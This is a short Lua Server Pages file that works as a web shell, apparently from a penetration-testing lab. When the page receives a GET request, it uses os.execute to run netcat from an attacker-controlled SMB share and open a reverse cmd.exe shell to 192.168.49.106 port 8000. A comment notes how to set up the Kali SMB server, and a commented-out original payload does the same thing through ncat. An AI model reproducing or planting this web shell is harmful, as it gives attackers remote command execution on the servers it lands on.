<div style="margin-left:auto;margin-right: auto;width: 350px;">

<div id="info">
<h2>Lua Server Pages Reverse Shell</h2>
<p>Delightful, isn't it?</p>
</div>

<?lsp if request:method() == "GET" then ?>
   # setup Kali SMB: $ python3 smbserver.py SMB . -debug -smb2support
   <?lsp os.execute("\\\\192.168.49.106\\SMB\\nc64.exe 192.168.49.106 8000 -e cmd.exe") ?>
   
   # ORIGINAL PAYLOAD:
   #<?lsp os.execute("cmd.exe /c net use x: \\\\192.168.49.106\\SMB & x:\\ncat.exe 192.168.49/106 8000 -e cmd.exe") ?>
<?lsp else ?>
   You sent a <?lsp=request:method()?> request
<?lsp end ?>

</div>
